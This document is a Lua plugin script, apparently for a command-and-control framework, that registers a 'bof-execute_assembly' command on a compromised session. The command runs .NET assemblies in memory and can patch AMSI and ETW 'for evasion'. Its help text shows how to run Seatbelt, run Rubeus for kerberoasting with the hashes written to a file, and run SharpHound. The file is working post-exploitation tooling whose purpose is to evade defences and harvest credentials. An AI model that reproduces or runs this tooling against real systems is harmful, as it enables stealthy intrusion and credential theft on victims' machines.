function bof_pack(format, ...)
    local args = {...}
    return pack_bof_args(format, args)
end
function read(filename)
    local file = io.open(filename, "r")
    if not file then
        print("file not found")
        return nil
    end
    local content = file:read("*all")
    file:close()
    return content
end

function new_sac()
    local sac = new_sacrifice(0, false, false, false, "")
    return sac
end

function has_clr_version(session, version_pattern)
    local clr_versions = session.Os.ClrVersion
    if clr_versions == nil then
        return false
    end

    -- Handle protobuf repeated field (use numeric indexing)
    local i = 1
    while true do
        local version = clr_versions[i]
        if version == nil then
            break
        end
        if string.find(version, version_pattern, 1, true) then
            return true
        end
        i = i + 1
    end
    return false
end

-- inline-ea: Execute .NET assemblies with inline execution and patching capabilities
local function run_inline_ea(args, cmd)
    if #args < 1 then 
        error("Usage: inline-ea <assembly_path> [arguments] [--amsi] [--etw] [--patchexit]")
    end
    
    local session = active()
    local arch = session.Os.Arch
    
    -- Parse arguments
    local assembly_path = args[1]
    local patch_amsi = cmd:Flags():GetBool("amsi")
    local patch_etw = cmd:Flags():GetBool("etw") 
    local patch_exit = cmd:Flags():GetBool("patchexit")

    -- Handle legacy argument parsing for backward compatibility
    local assembly_args = {}
    for i = 2, #args do
        local arg = args[i]
        if arg == "--amsi" then
            patch_amsi = true
        elseif arg == "--etw" then
            patch_etw = true
        elseif arg == "--patchexit" then
            patch_exit = true
        else
            table.insert(assembly_args, arg)
        end
    end
    
    ---- Combine flag args with positional args
    --if assembly_args ~= "" then
    --    if #dotnet_args > 0 then
    --        assembly_args = table.concat(dotnet_args, " ") .. " " .. assembly_args
    --    end
    --else
    --    assembly_args = table.concat(dotnet_args, " ")
    --end
    
    -- Read assembly file
    local assembly_handle = io.open(assembly_path, "rb")
    if assembly_handle == nil then
        error("Failed to read assembly file: " .. assembly_path)
    end
    
    local assembly_bytes = assembly_handle:read("*all")
    assembly_handle:close()
    
    if not assembly_bytes or #assembly_bytes == 0 then
        error("Assembly file is empty or unreadable")
    end
    
    local assembly_length = #assembly_bytes
    
    -- Convert boolean flags to integers for BOF
    local amsi_flag = patch_amsi and 1 or 0
    local etw_flag = patch_etw and 1 or 0
    local exit_flag = patch_exit and 1 or 0
    
    -- Pack arguments for BOF: assembly_length, assembly_bytes, arguments, amsi_flag, etw_flag, exit_flag
    local packed_args = bof_pack("biZiii",
        assembly_bytes,
        assembly_length,
        assembly_args,
        amsi_flag,
        etw_flag, 
        exit_flag
    )
    
    -- Get BOF file path
    local bof_file = "lib/inline-ea/inline-ea." .. arch .. ".o"
    
    return bof(session, script_resource(bof_file), packed_args, true)
end

local cmd_inline_ea = command("bof-execute_assembly", run_inline_ea,
        "Execute .NET assemblies with inline execution and patching", "T1055")
cmd_inline_ea:Flags():Bool("amsi", false, "Patch AMSI before execution")
cmd_inline_ea:Flags():Bool("etw", false, "Patch ETW before execution") 
cmd_inline_ea:Flags():Bool("patchexit", false, "Patch exit functions")
cmd_inline_ea:Flags():String("args", "", "Arguments to pass to the assembly")
opsec("bof-execute_assembly", 8.5)

help("bof-execute_assembly", [[
Execute .NET assemblies with inline execution and optional patching capabilities.

Examples:
  bof-execute_assembly C:\Tools\Seatbelt.exe                                    # Basic execution
  bof-execute_assembly C:\Tools\Seatbelt.exe --amsi --etw                       # With AMSI and ETW patching
  bof-execute_assembly C:\Tools\Rubeus.exe --args "kerberoast /outfile:hashes"  # With arguments
  bof-execute_assembly C:\Tools\SharpHound.exe --patchexit                      # With exit patching

Legacy positional format (still supported):
  bof-execute_assembly C:\Tools\Seatbelt.exe --amsi --etw AntiVirus
  bof-execute_assembly C:\Tools\Rubeus.exe kerberoast /outfile:hashes --amsi

Options:
  --amsi: Patch AMSI (Anti-Malware Scan Interface) before execution
  --etw: Patch ETW (Event Tracing for Windows) before execution  
  --patchexit: Patch exit functions to prevent assembly from terminating the process
  --args: Arguments to pass to the .NET assembly

Features:
- Inline execution without dropping files to disk
- Optional AMSI/ETW patching for evasion
- Process exit protection
- Support for command-line arguments
- Compatible with most .NET assemblies

Note: This technique loads and executes .NET assemblies directly in memory
using inline assembly execution, providing better OPSEC than traditional methods.
]])

